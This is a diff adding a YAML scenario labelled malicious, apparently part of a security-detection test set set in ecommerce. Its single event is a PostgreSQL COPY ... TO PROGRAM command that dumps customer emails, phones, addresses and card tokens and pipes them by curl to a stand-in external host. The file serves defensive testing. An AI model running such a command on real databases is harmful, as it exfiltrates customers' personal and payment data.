@@ -1,0 +1,21 @@
+scenario_id: ecommerce_run_03_fraud_dispute_export_mal
+family_id: ecommerce_run_03_fam_fraud_dispute_export
+domain: ecommerce
+matched_pair_id: ecommerce_run_03_fraud_dest_pair_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content, connects_to_destination]
+default_class: malicious
+rule_engine_relationship: agrees
+time_of_day: "06:45"
+sessions:
+  - session_label: export_case
+    role: fraud_analyst
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [4.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT c.email, c.phone, c.shipping_address, p.card_token, p.card_last4 FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments p ON p.order_id = o.order_id) TO PROGRAM 'curl -sX POST https://fraudops-intake.vbazaar.example/case-intake --data-binary @-'"
+        connects_to: {ip: "185.220.101.7", port: 8443}
